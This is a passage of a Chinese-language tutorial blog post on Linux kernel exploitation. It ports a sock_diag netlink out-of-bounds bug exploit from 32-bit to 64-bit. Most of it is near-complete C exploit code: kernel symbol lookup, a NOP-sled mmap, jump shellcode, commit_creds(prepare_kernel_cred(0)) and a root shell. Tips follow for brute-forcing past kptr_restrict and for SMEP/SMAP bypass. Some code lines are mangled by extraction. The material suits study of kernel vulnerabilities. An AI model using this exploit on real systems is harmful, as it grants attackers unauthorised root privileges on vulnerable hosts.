    struct inet_diag_sockid {
        __be16    idiag_sport;
        __be16    idiag_dport;
        __be32    idiag_src[4];
        __be32    idiag_dst[4];
        __u32    idiag_if;
        __u32    idiag_cookie[2];
    };
> 最主要的还是 _unix_diag_req_ 结构最简单，利用起来最方便。
**Secondly** ，需要计算出family的取值到底要多少，不能大也不能小。
> 在32位里，family = (nl_table – sock_diag_handlers)/4  
>  显然，在64位里，family = (nl_table – sock_diag_handlers)/8
现在的问题是如何获取这两个结构体的具体地址，如果内核设置 _kernel.kptr_restrict=0_ ，那么我们可以直接从
_/proc/kallsyms_ 里获取，如果禁止，那连 _/boot/linux-image-xxx-generic_ 里也无法获取。
**Thirdly** ,因为32位的exp可以搜到，链接放在文后，所以我就选取一些修改点来分析。
    [...]
    int jump_payload_not_used(void *skb, void *nlh)
    {
      asm volatile (
        "mov $kernel_code, %eaxn"
        "call *%eaxn"
      );
    }
    [...]
        //填充数据包，就是为了最终能够执行到__sock_diag_rcv_msg中去
      memset(&req, 0, sizeof(req));
      req.nlh.nlmsg_len = sizeof(req);
      req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
      req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;
      req.nlh.nlmsg_seq = 123456;
      req.r.udiag_states = -1;
      req.r.udiag_show = UDIAG_SHOW_NAME | UDIAG_SHOW_PEER | UDIAG_SHOW_RQLEN;
     [...]
      unsigned long mmap_start, mmap_size;
      mmap_start = 0x10000;  //选择了一块1MB多的内存区域
      mmap_size = 0x120000;  
      printf("mmapping at 0x%lx, size = 0x%lxn", mmap_start, mmap_size);
            if (mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,
                    MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) == MAP_FAILED) {
                    printf("mmap faultn");
                    exit(1);
            }
      memset((void*)mmap_start, 0x90, mmap_size);         //将其全部填充为0x90，在X86系统中对应的是NOP指令
      char jump[] = "x55x89xe5xb8x11x11x11x11xffxd0x5dxc3"; // jump_payload in asm
      unsigned long *asd = &jump[4];
      *asd = (unsigned long)kernel_code; //使用kernel_code函数的地址替换掉jump[]中的0x11
      memcpy( (void*)mmap_start+mmap_size-sizeof(jump), jump, sizeof(jump));
      [...]
大牛的利用思路是，获取 _rehash_time_ 大致取值范围，然后在那块区域布满 _nop_
指令用于堆喷，再写一个提权子函数后，利用很巧妙的手法，塞进区域的最后，由 _call xxx_
来成功突破。换言之，32位转变成64位，最重要的就是获取64位下 _rehash_time_
的范围，就是64位的指令格式和长度不同，还有就是数据类型大小也有所不同。
**Fourthly** ,写出64位下的 _jump_payload_ 汇编语句后，靠 _objdump_
来编译出机器码，值得注意的是，64位里，你设置的跳转地址不同，机器码也会有所不同。
接下来需要调试出64位里 _rehash_time_ 的位置，这会在下节讲。等到这两点都获取了，那么64位的exp也差不多写成了。
    #include
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
    typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
    _commit_creds commit_creds;
    _prepare_kernel_cred prepare_kernel_cred;
    unsigned long sock_diag_handlers, nl_table;
    int __attribute__((regparm(3))) //获取root权限
    kernel_code()
    {
        commit_creds(prepare_kernel_cred(0));
        //return -1;
    }
    int jump_payload_not_used(void *skb, void *nlh)
    {
        asm volatile (
            "mov $kernel_code, %raxn"
            "call *%raxn"
        );
    }
    unsigned long
    get_symbol(char *name)
    {
        FILE *f;
        unsigned long addr;
        char dummy, sym[512];
        int ret = 0;
        f = fopen("/proc/kallsyms", "r");
        if (!f) {
            return 0;
        }
        while (ret != EOF) {
            ret = fscanf(f, "%p %c %sn", (void **) &addr, &dummy, sym);
            if (ret == 0) {
                fscanf(f, "%sn", sym);
                continue;
            }
            if (!strcmp(name, sym)) {
                printf("[+] resolved symbol %s to %pn", name, (void *) addr);
                fclose(f);
                return addr;
            }
        }
        fclose(f);
        return 0;
    }
    int main(int argc, char*argv[])
    {
        int fd;
        unsigned family;
        struct {
            struct nlmsghdr nlh;
            struct unix_diag_req r;
        } req;
        char buf[8192];
        if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) 255){
            printf("nl_table is too far!n");
            exit(1);
            }
          req.r.sdiag_family = family;
        unsigned long mmap_start, mmap_size;
        mmap_start = 0xfffd0000;
        mmap_size = 0x20000;
        printf("mmapping at 0x%lx, size = 0x%lxn", mmap_start, mmap_size);
            if (mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,
                    MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) == MAP_FAILED) {
                    printf("mmap faultn");
                    exit(1);
            }
        memset((void*)mmap_start, 0x90, mmap_size); //将申请的内存区域全部填充为nop
        char jump[] = "x55x48x89xe5x48xb8x11x11x11x11x11x11x11x11xffxd0x5dxc3"; // jump_payload in asm
        unsigned long *asd =(unsigned long *)&jump[6];  
        //将x11全部替换成kernel_code
        *asd = (unsigned long)kernel_code;
         printf("[+] kernel_code: %pn",(void *) kernel_code);
        //把jump_payload放进mmap的内存的最后
        memcpy( (void*)mmap_start+mmap_size-sizeof(jump), jump, sizeof(jump));
        send(fd, &req, sizeof(req), 0); //发送socket触发漏洞
        printf("uid=%d, euid=%dn",getuid(), geteuid() );
        system("/bin/sh");
    }
###  调试过程
首先，要下内核断点，这里选取的是 ___sock_diag_rcv_msg_ 函数，它离调用点很近。
其次，查看结构体 _netlink_table_ 的子结构体 _nl_pid_hash_ 的子成员 _rehash_time_
的值。多次调试可以知道取值范围。
然后，查看（dump _）函数的汇编代码流程，查看正常和溢出时不一样的变化。_
_  
_
_可以看出，正常rax已经为零，不再去执行(dump_ )函数，而伪造的继续执行。
接着，查看shellcode流的走向。
最后，成功提权，拿到了root权限，虽然这是在毫无内核保护机制之下。
## 简单绕过
内核最常见的是内核地址随机化保护( _kaslr_ ),但是查看exp流程，你会发现，基本没有需要突破 _kaslr_
的地方，因为地址已经被泄露出来了。那么，如果 _kernel.kptr_restrict=1_
的时候，地址被封禁，也就是没办法去调用符号的地址。这个时候也不可以查看 _dmesg_
日志里的报错信息，因为进程间通信错误会使内核这一板块失效，之后再去运行时就会卡死。
但我们也不是没有办法，根据反复调试，每个linux版本里这两个结构体的相对位置大致不变。可以编写自动化脚本，给一个固定的值，反复重启爆破出某次正好凑齐的值。
之后还有 _smep_ 、 _smap_ 的内核禁止执行用户空间代码的保护，绕过这种保护，一般使用 _rop_ 来突破，就像一般pwn题用它来绕过 _NX_
一样。但是，这内核空间里没有可以直接利用的栈空间，连一句 _rop_
也无法执行。比较少见的方式是去修改使内核误以为用户空间页是内核空间页。两者详细利用，我都会在下篇里进行讲述，下篇也会调试几个最近有关虚拟页表的内核cve漏洞。  
 ~~我绝对不会说JOJO的奇妙冒险更新了，我赶着去看，所以不想再往下写了。~~
## 上篇总结
内核调试总是要走很多弯路，幸好很多坑前辈已经帮你踩过，你也在常规的pwn题里跌倒过，最后上手总是快些。但是密密麻麻的函数流程，比python难上手的linux下的C编程，总是令人恐惧。这是无可奈何的事，田园时代已过，未来只会更加凶险。你能做到就是盯着它看，代码烂熟于心，就算找不到漏洞，那至少也是一名内核工程师了。  
上篇主要还是讲了讲调试内核的入门，分析的漏洞也是一个较为明显的越界，也怪我懒散，拖拖拉拉到现在才写完。那我们就在猴年马月的下篇再见了。
## 参考资料
(1).  
(2).  
(3).